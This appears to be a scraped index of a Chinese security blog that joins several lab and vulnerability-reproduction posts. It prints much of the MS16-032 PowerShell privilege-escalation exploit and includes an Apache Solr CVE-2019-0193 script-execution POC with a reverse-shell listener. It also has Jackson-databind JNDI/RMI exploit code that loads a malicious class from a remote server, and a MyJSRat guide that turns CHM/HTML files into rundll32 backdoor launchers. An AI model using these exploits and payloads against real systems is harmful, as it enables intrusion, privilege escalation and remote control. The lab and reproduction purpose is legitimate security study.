meterpreter 利用 getsystem 尝试提权，发现失败。 尝试用 msf 本地提权。 寻找可用的exp，发现利用 ms16-032 可以针对 windows server 2012。 但是在尝试的时候发现一直不成功，反弹的 shell 并不是 system 权限。 遂搜索该漏洞的利用脚本。 function Invoke-MS16-032 { \u003c# .SYNOPSISPowerShell implementation of MS16-032. The exploit targets all vulnerable operating systems that support PowerShell v2+. Credit for the discovery of the bug and the logic to exploit it go to James Forshaw (@tiraniddo). Targets: * Win7-Win10 \u0026 2k8-2k12 \u003c== 32/64 bit! * Tested on x32 Win7, x64 Win8, x64 2k12R2 Notes: * In order for the race condition to succeed the machine must have 2+ CPU cores. If testing in a VM just make sure to add a core if needed mkay. * The exploit is pretty reliable, however ~1/6 times it will say it succeeded but not spawn a shell. Not sure what the issue is but just re-run and profit! * Want to know more about MS16-032 ==\u003e https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html .DESCRIPTIONAuthor: Ruben Boonen (@FuzzySec) Blog: http://www.fuzzysecurity.com/ License: BSD 3-Clause Required Dependencies: PowerShell v2+ Optional Dependencies: None .PARAMETERApplication Specifies an Application to run. .PARAMETERCommandline Specifies Commandline, such as net user xxx xxx /add .EXAMPLEC:\\PS\u003e Invoke-MS16-032 -Application C:\\Windows\\System32\\cmd.exe C:\\PS\u003e Invoke-MS16-032 -Application C:\\Windows\\System32\\cmd.exe -Commandline \"/c net user 1 1 /add\" #\u003e [CmdletBinding()] param( [Parameter(Mandatory = $False, ParameterSetName = 'C:\\Windows\\System32\\cmd.exe' )] [string] $Application, [Parameter(Mandatory = $False)] [string] $Commandline ) Add-Type -TypeDefinition @\" using System; using System.Diagnostics; using System.Runtime.InteropServices; using System.Security.Principal; [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; } [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)] public struct STARTUPINFO { public Int32 cb; public string lpReserved; public string lpDesktop; public string lpTitle; public Int32 dwX; public Int32 dwY; public Int32 dwXSize; public Int32 dwYSize; public Int32 dwXCountChars; public Int32 dwYCountChars; public Int32 dwFillAttribute; public Int32 dwFlags; public Int16 wShowWindow; public Int16 cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; } [StructLayout(LayoutKind.Sequential)] public struct SQOS { public int Length; public int ImpersonationLevel; public int ContextTrackingMode; public bool EffectiveOnly; } public static class Advapi32 { [DllImport(\"advapi32.dll\", SetLastError=true, CharSet=CharSet.Unicode)] public static extern bool CreateProcessWithLogonW( String userName, String domain, String password, int logonFlags, String applicationName, String commandLine, int creationFlags, int environment, String currentDirectory, ref STARTUPINFO startupInfo, out PROCESS_INFORMATION processInformation); [DllImport(\"advapi32.dll\", SetLastError=true)] public static extern bool SetThreadToken( ref IntPtr Thread, IntPtr Token); [DllImport(\"advapi32.dll\", SetLastError=true)] public static extern bool OpenThreadToken( IntPtr ThreadHandle, int DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle); [DllImport(\"advapi32.dll\", SetLastError=true)] public static extern bool OpenProcessToken( IntPtr ProcessHandle, int DesiredAccess, ref IntPtr TokenHandle); [DllImport(\"advapi32.dll\", SetLastError=true)] public extern static bool DuplicateToken( IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, ref IntPtr DuplicateTokenHandle); } public static class Kernel32 { [DllImport(\"kernel32.dll\")] public static extern uint Get","date":"2019-08-13","objectID":"/2019/08/hacktheboxoptimum/:2:0","tags":["HTB靶场"],"title":"Hack The Box —— Optimum","uri":"/2019/08/hacktheboxoptimum/"},{"categories":["靶场"],"content":"Hack The Box靶场练习记录","date":"2019-08-10","objectID":"/2019/08/hacktheboxlame/","tags":["HTB靶场"],"title":"Hack The Box —— Lame","uri":"/2019/08/hacktheboxlame/"},{"categories":["靶场"],"content":"Hack The Box —— Lame ","date":"2019-08-10","objectID":"/2019/08/hacktheboxlame/:0:0","tags":["HTB靶场"],"title":"Hack The Box —— Lame","uri":"/2019/08/hacktheboxlame/"},{"categories":["靶场"],"content":"信息搜集与漏洞利用 先上 nmap 扫描一波： nmap -T4 -A -v 10.10.10.3 发现开了四个端口。 搜索 vsftpd 相关漏洞，发现2.3.4版本自带后门，在 metasploit 上搜索，发现该漏洞无法利用。 转而寻找 samba 3.0.20 版本漏洞，在 msf 上发现了一个 excellent 级别的漏洞，填上 IP ，exploit 执行： 反弹到 shell。 ","date":"2019-08-10","objectID":"/2019/08/hacktheboxlame/:1:0","tags":["HTB靶场"],"title":"Hack The Box —— Lame","uri":"/2019/08/hacktheboxlame/"},{"categories":["靶场"],"content":"获取flag ","date":"2019-08-10","objectID":"/2019/08/hacktheboxlame/:2:0","tags":["HTB靶场"],"title":"Hack The Box —— Lame","uri":"/2019/08/hacktheboxlame/"},{"categories":["靶场"],"content":"user.txt cat /home/makis/user.txt ","date":"2019-08-10","objectID":"/2019/08/hacktheboxlame/:2:1","tags":["HTB靶场"],"title":"Hack The Box —— Lame","uri":"/2019/08/hacktheboxlame/"},{"categories":["靶场"],"content":"root.txt cat /root/root.txt ","date":"2019-08-10","objectID":"/2019/08/hacktheboxlame/:2:2","tags":["HTB靶场"],"title":"Hack The Box —— Lame","uri":"/2019/08/hacktheboxlame/"},{"categories":["漏洞复现"],"content":"Apache Solr 远程命令执行漏洞复现","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","tags":["漏洞复现","Solr"],"title":"Apache Solr 远程命令执行漏洞复现","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"Apache Solr 远程命令执行漏洞 2019 年 8 月 1 日，Apache Solr 官方发布了 CVE-2019-0193 漏洞预警，漏洞危害评级为严重。 此次漏洞出现在 Apache Solr 的 DataImportHandler ，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。它具有一个功能，其中所有的 DIH 配置都可以通过外部请求的 dataConfig 参数来设置。由于 DIH 配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。 360CERT 判断漏洞等级为高，建议 Apache Solr 用户及时升级以防止攻击者攻击。 ","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["漏洞复现","Solr"],"title":"Apache Solr 远程命令执行漏洞复现","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"POC \u003cdataConfig\u003e \u003cscript\u003e\u003c![CDATA[ function f1(row){ var run = java.lang.Runtime.getRuntime().exec(\"touch /tmp/success\"); row.put('name', 'Hello World!'); return row; } ]]\u003e\u003c/script\u003e \u003cdocument\u003e \u003centity name=\"person\" transformer=\"script:f1\" query=\"select * from person\" pk=\"id\"\u003e \u003cfield column=\"id\" name=\"id\" /\u003e \u003cfield column=\"name\" name=\"name\" /\u003e \u003c/entity\u003e \u003c/document\u003e \u003c/dataConfig\u003e ","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["漏洞复现","Solr"],"title":"Apache Solr 远程命令执行漏洞复现","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"漏洞成因 该漏洞的产生是由于两方面的原因： 用户在 solrconfig.xml 文件中设置了 DataImportHandler，开启了 DataImport 功能。 DataImportHandler 模块允许用户自己包含脚本，来进行配置。 攻击者可以通过构造恶意的脚本交由转换器进行解析，在Solr解析的过程中并未对用户的输入做检查，可导致攻击者远程在Solr服务器上执行命令。 ","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["漏洞复现","Solr"],"title":"Apache Solr 远程命令执行漏洞复现","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"环境搭建 ","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":["漏洞复现","Solr"],"title":"Apache Solr 远程命令执行漏洞复现","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"solr部署 本环境采用docker部署 拉取镜像：docker pull solr: 8.1.1 启动容器：docker run –name solr -d -p 8983:8983 -t solr:8.1.1 访问 http://IP:8983/，apache solr 框架部署完毕 ","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:1","tags":["漏洞复现","Solr"],"title":"Apache Solr 远程命令执行漏洞复现","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"开启DataImportHandler插件 新建core： 点击Add Core，solr系统报错。 然后执行：docker exec -it –user root solr /bin/bash，进入 solr 容器。 进入容器后，执行： cp /opt/solr-8.1.1/server/solr/configsets/_default/conf /var/solr/data/new_core/ cp /opt/solr/dist/solr-dataimporthandler-8.1.1.jar /opt/solr/server/solr-webapp/webapp/WEB-INF/lib cp /opt/solr/dist/solr-dataimporthandler-extras-8.1.1.jar /opt/solr/server/solr-webapp/webapp/WEB-INF/lib cd /var/solr/data/new_core/conf/ vim solrconfig.xml ","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:2","tags":["漏洞复现","Solr"],"title":"Apache Solr 远程命令执行漏洞复现","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"DataImportHandler 插件配置 将下面的 XML 添加到solrconfig.xml中 \u003crequestHandler name=\"/dataimport\" class=\"org.apache.solr.handler.dataimport.DataImportHandler\" \u003e \u003clst name=\"defaults\"\u003e \u003cstr name=\"config\"\u003edata-config.xml\u003c/str\u003e \u003c/lst\u003e \u003c/requestHandler\u003e 注：XML 的格式一定按照上述格式，否则会报错！ 执行vim data-config.xml，并将下面 XML 保存至该文件： \u003cdataConfig\u003e \u003cdataSource driver=\"com.mysql.jdbc.Driver\" url=\"jdbc:mysql://IP:3306/securityTest\" user=\"root\" password=\"root\" /\u003e \u003cdocument\u003e \u003centity name=\"person\" query=\"select * from person\" pk=\"id\"\u003e \u003cfield column=\"id\" name=\"id\" /\u003e \u003cfield column=\"name\" name=\"name\" /\u003e \u003c/entity\u003e \u003c/document\u003e \u003c/dataConfig\u003e 然后将 mysql-connector-java-5.1.48.jar 放入 /opt/solr/server/solr-webapp/webapp/WEB-INF/lib 文件夹下 ","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:3","tags":["漏洞复现","Solr"],"title":"Apache Solr 远程命令执行漏洞复现","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"重启 solr 然后重启 solr：./opt/solr/bin/solr restart 至此，漏洞环境搭建完毕，搭建成功的截图如下： ","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:4","tags":["漏洞复现","Solr"],"title":"Apache Solr 远程命令执行漏洞复现","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"漏洞测试 ","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":["漏洞复现","Solr"],"title":"Apache Solr 远程命令执行漏洞复现","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"访问管理页面 浏览器访问：http://IP:8983/ ","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:1","tags":["漏洞复现","Solr"],"title":"Apache Solr 远程命令执行漏洞复现","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"开启 Debug 模式 将 poc 复制到 Configuration 中： 可在标注的地方更换受害机执行的命令，本文以反弹shell为例。 ","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:2","tags":["漏洞复现","Solr"],"title":"Apache Solr 远程命令执行漏洞复现","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"开启监听 nc -lp 4567 ","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:3","tags":["漏洞复现","Solr"],"title":"Apache Solr 远程命令执行漏洞复现","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"执行命令 点击 Execute with this Configuration 执行成功可以发现shell已经成功反弹： ","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:4","tags":["漏洞复现","Solr"],"title":"Apache Solr 远程命令执行漏洞复现","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"影响范围 Apache Solr \u003c 8.2.0 ","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:5:0","tags":["漏洞复现","Solr"],"title":"Apache Solr 远程命令执行漏洞复现","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"修复建议 将Apache Solr 升级至 8.2.0 或之后的版本 ","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:6:0","tags":["漏洞复现","Solr"],"title":"Apache Solr 远程命令执行漏洞复现","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"CVE-2019-14361 与 CVE-2019-14379 漏洞复现","date":"2019-08-01","objectID":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","tags":["Jackson-databind","漏洞复现"],"title":"CVE-2019-14361与CVE-2019-14379漏洞复现","uri":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"CVE-2019-14361 \u0026 CVE-2019-14379漏洞复现 7月30日晚收到了推送，得知 Jackson-databind 又出了新的 RCE ，又有大佬找到了新的利用方式。 ","date":"2019-08-01","objectID":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:0","tags":["Jackson-databind","漏洞复现"],"title":"CVE-2019-14361与CVE-2019-14379漏洞复现","uri":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"漏洞分析 根据 Jackson 开发者的 issue ，触发这个 Jackson 漏洞需要满足如下要求， 目标应用接收到不可信客户端发送的 JSON 数据 目标应用使用多态类型处理方式来处理 java.lang.Object 类型的属性； 在该漏洞中就是依赖的第三方 jar 包有点多(感觉在实际利用过程中能遇到这些个库也挺巧的) ","date":"2019-08-01","objectID":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:0","tags":["Jackson-databind","漏洞复现"],"title":"CVE-2019-14361与CVE-2019-14379漏洞复现","uri":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"环境搭建 本文中用到的第三方库有： jackson-annotations-2.9.8 jackson-core-2.9.8 jackson-databind-2.9.8 ehcache-2.9.1 slf4j-api-1.7.7 logback-core-1.3.0-alpha4 slf4j-simple-1.7.21 javax.transaction_1.0.0.0_1-1 在 http://www.mvnrepository.com 上下载即可。 ","date":"2019-08-01","objectID":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:0","tags":["Jackson-databind","漏洞复现"],"title":"CVE-2019-14361与CVE-2019-14379漏洞复现","uri":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"漏洞代码 import com.fasterxml.jackson.databind.ObjectMapper; import com.fasterxml.jackson.databind.SerializationFeature; import java.lang.Exception; public class Main { public static void main(String[] args) { System.out.println(\"Mapping\"); // 注意，在高版本的JDK上存在限制，需要将com.sun.jndi.rmi.object.trustURLCodebase的值设置为true，默认为false System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\", \"true\"); // CVE-2019-14361 payload String jsonStr1 = \"[\\\"ch.qos.logback.core.db.JNDIConnectionSource\\\", {\\\"jndiLocation\\\":\\\"rmi://127.0.0.1:1099/ExportObject\\\"}]\"; // CVE-2019-14379 payload String jsonStr2 = \"[\\\"net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup\\\",{\\\"properties\\\":{\\\"jndiName\\\":\\\"rmi://127.0.0.1:1099/ExportObject\\\"}}]\"; ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false); System.out.println(\"Serializing\"); Object obj = null; try { // !-\u003e此处更换payload\u003c-! obj = mapper.readValue(jsonStr1, java.lang.Object.class); } catch(Exception e) { e.printStackTrace(); } System.out.println(\"objectified\"); try { mapper.writeValueAsString(obj); } catch(Exception e) { e.printStackTrace(); } try { System.out.println(\"stringified: \" + mapper.writeValueAsString(obj)); } catch(Exception e) { e.printStackTrace(); } } } ","date":"2019-08-01","objectID":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:3:0","tags":["Jackson-databind","漏洞复现"],"title":"CVE-2019-14361与CVE-2019-14379漏洞复现","uri":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"构建步骤 本文在 IDEA 上生成项目 新建 java Commandline 项目 将上述代码复制进 Main 函数 单击红框中的图标，进入项目结构设置 将下载好的外部库导入到项目中 具体导入步骤可以参考我的这篇文章，再此不做赘述 https://www.secquan.org/BugWarning/1069944 ","date":"2019-08-01","objectID":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:4:0","tags":["Jackson-databind","漏洞复现"],"title":"CVE-2019-14361与CVE-2019-14379漏洞复现","uri":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"攻击流程 开启 RMI 服务 为了方便，我们可以使用marshalsec这款神器，可以快速开启 RMI 和 LDAP 服务。当然你需要下载源码包，使用 maven 编译。下载链接：https://github.com/mbechler/marshalsec，下载到本地后，利用 mvn clean package -DskipTests 即可编译，编译的结果如下： 开启 RMI 服务： java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://ip:8000/#ExportObject 注：：# 后面填写你的恶意类的类名，它会自动绑定 URI，rmi 默认端口号为 1099 。 编译 ExportObject.java ExportObject.java代码内容如下： package com.by.rmi; import java.io.BufferedReader; import java.io.InputStreamReader; public class ExportObject { public ExportObject() throws Exception { Process proc = Runtime.getRuntime().exec(\"open /Applications/Calculator.app\"); BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream())); StringBuffer sb = new StringBuffer(); String line; while((line = br.readLine()) != null) { sb.append(line).append(\"\\n\"); } String result = sb.toString(); Exception e = new Exception(result); throw e; } public static void main(String[] args) throws Exception { ExportObject e = new ExportObject(); } } 注：上述代码的功能为在 mac 平台上弹出计算器，如更换平台，请自行更换 exec 函数中的内容。 编译成class文件： javac ExportObject.java 在生成 ExportObject.class 文件夹下执行 python2 -m SimpleHTTPServer 8000，在本地启动 HTTP 服务。 ","date":"2019-08-01","objectID":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:5:0","tags":["Jackson-databind","漏洞复现"],"title":"CVE-2019-14361与CVE-2019-14379漏洞复现","uri":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"CVE-2019-14361 测试 将 POC 中的 payload 更换为 jsonStr1，并编译运行，结果如下： ","date":"2019-08-01","objectID":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:6:0","tags":["Jackson-databind","漏洞复现"],"title":"CVE-2019-14361与CVE-2019-14379漏洞复现","uri":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"CVE-2019-14379 测试 将 POC 中的 payload 更换为 jsonStr2，并编译运行，结果如下： 相应的，rmi 服务运行的截图如下： ","date":"2019-08-01","objectID":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:7:0","tags":["Jackson-databind","漏洞复现"],"title":"CVE-2019-14361与CVE-2019-14379漏洞复现","uri":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"MyJSRat结合CHM命令执行","date":"2019-07-28","objectID":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","tags":["Tips","渗透测试"],"title":"MyJSRat结合CHM命令执行","uri":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["渗透测试"],"content":"MyJSRat结合CHM命令执行 ","date":"2019-07-28","objectID":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:0:0","tags":["Tips","渗透测试"],"title":"MyJSRat结合CHM命令执行","uri":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["渗透测试"],"content":"MyJSRat MyJSRat 是 JSBackdoor 的 python 版本 下载地址:https://github.com/Ridter/MyJSRat ","date":"2019-07-28","objectID":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:1:0","tags":["Tips","渗透测试"],"title":"MyJSRat结合CHM命令执行","uri":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["渗透测试"],"content":"Easy CHM CHM是英语 Compiled Help Manual 的简写，即「已编译的帮助文件」。CHM 是微软新一代的帮助文件格式，利用 HTML 作源文，把帮助内容以类似数据库的形式编译储存。 ","date":"2019-07-28","objectID":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:2:0","tags":["Tips","渗透测试"],"title":"MyJSRat结合CHM命令执行","uri":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["渗透测试"],"content":"步骤 ","date":"2019-07-28","objectID":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:3:0","tags":["Tips","渗透测试"],"title":"MyJSRat结合CHM命令执行","uri":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["渗透测试"],"content":"下载 MyJSRat 并运行 git clone https://github.com/Ridter/MyJSRat python MyJSRat.py -i IPaddr -p port ","date":"2019-07-28","objectID":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:3:1","tags":["Tips","渗透测试"],"title":"MyJSRat结合CHM命令执行","uri":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["渗透测试"],"content":"下载 wtf 文件 浏览器访问 https://IPaddr:port/wtf，并保存至 txt 文件中 ","date":"2019-07-28","objectID":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:3:2","tags":["Tips","渗透测试"],"title":"MyJSRat结合CHM命令执行","uri":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["渗透测试"],"content":"将上面保存的代码写入到如下代码的 Item1 的 Value 值中 注：要在 rundll32.exe 前后添加, \u003c!DOCTYPE html\u003e\u003chtml\u003e\u003chead\u003e\u003ctitle\u003eMousejack replay\u003c/title\u003e\u003chead\u003e\u003c/head\u003e\u003cbody\u003ecommand exec \u003cOBJECT id=x classid=\"clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11\" width=1 height=1\u003e\u003cPARAM name=\"Command\" value=\"ShortCut\"\u003e \u003cPARAM name=\"Button\" value=\"Bitmap::shortcut\"\u003e \u003cPARAM name=\"Item1\" value=',rundll32.exe,'\u003e \u003cPARAM name=\"Item2\" value=\"273,1,1\"\u003e\u003c/OBJECT\u003e\u003cSCRIPT\u003ex.Click();\u003c/SCRIPT\u003e\u003c/body\u003e\u003c/html\u003e ","date":"2019-07-28","objectID":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:3:3","tags":["Tips","渗透测试"],"title":"MyJSRat结合CHM命令执行","uri":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["渗透测试"],"content":"保存为 HTML 文件 新建目录，将上述代码保存在新建文件夹中 